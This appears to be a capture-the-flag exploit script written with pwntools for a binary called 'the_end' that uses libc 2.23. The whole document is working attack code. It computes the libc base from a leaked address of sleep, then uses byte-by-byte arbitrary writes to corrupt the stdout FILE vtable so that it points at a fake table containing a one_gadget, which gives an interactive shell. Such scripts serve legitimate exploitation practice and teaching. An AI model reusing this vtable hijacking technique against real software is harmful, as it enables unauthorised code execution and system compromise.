#!/usr/bin/env python3
from pwn import *
from time import sleep

exe = ELF("./the_end")
libc = ELF("./libc-2.23.so")
context.binary = exe
context.terminal = "tmux splitw -h".split()
context.log_level = "debug"

global io

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process("./the_end_patched")
else:
    io = process(f"gdbserver localhost:1337 ./the_end_patched --no-disable-randomization".split())
    for i in range(3):
        io.recvline()
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

reu("here is a gift ")
libc.address = int(re(14),16) - libc.symbols["sleep"]
log.info("Libc -> %s" % hex(libc.address))

vtable = libc.address + 0x3c56f8
log.info("stdout vtable -> %s" % hex(vtable))

fake_vtable = libc.address + 0x3c56c0
log.info("Fake vtable -> %s" % hex(fake_vtable))

one_gadget = libc.address + 0xf02b0
log.info("one_gadget -> %s" % hex(one_gadget))

rl()
for i in range(2):
    s(p64(vtable+i))
    s(chr(int(hex(fake_vtable)[-4:][2-2*i:4-2*i],16)).encode('latin-1'))

for i in range(3):
    s(p64(fake_vtable+0x58+i))
    s(chr(int(hex(one_gadget)[-6:][4-2*i:6-2*i],16)).encode('latin-1'))

io.interactive()